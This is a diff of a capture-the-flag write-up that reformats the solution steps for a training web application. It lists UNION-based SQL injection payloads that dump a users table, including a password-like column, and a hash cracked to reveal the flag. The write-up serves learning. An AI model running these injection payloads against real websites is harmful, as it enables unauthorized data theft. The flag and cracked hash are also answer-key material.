@@ -16,26 +16,23 @@ From here on out we can genlty manipulate the database and ask it to give the na
 
     ### One of these tables is users
     Table : users
-    Colunm : user_id
-    Colunm : first_name
-    Colunm : last_name
-    Colunm : town
-    Colunm : country
-    Colunm : planet
-    Colunm : Commentaire
-    Colunm : countersign
+    > Colunm : user_id
+    > Colunm : first_name
+    > Colunm : last_name
+    > Colunm : town
+    > Colunm : country
+    > Colunm : planet
+    > Colunm : Commentaire
+    > Colunm : countersign
  * And through a number of these commands we are able to retrieve out flag   
     ### Retrive flag
-    *       1 UNION (SELECT user_id, first_name FROM users);--
-    *       1 UNION (SELECT last_name, town FROM users);--
-    *       1 UNION (SELECT country, planet FROM users);--
-    *       1 UNION (SELECT Commentaire, countersign FROM users);--
+    * 1 UNION (SELECT user_id, first_name FROM users);--
+    * 1 UNION (SELECT last_name, town FROM users);--
+    * 1 UNION (SELECT country, planet FROM users);--
+    * 1 UNION (SELECT Commentaire, countersign FROM users);--
 
-
-{
-    instruction: Decrypt this password -> then lower all the char. Sh256 on it and it's good !   
-    hash : 5ff9d0165b4f92b14994e5c685cdce28
-}
+    * instruction: Decrypt this password -> then lower all the char. Sh256 on it and it's good !   
+    * hash : 5ff9d0165b4f92b14994e5c685cdce28
 
 flag: 5ff9d0165b4f92b14994e5c685cdce28 -md5> fortytwo  -sha256> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 
 
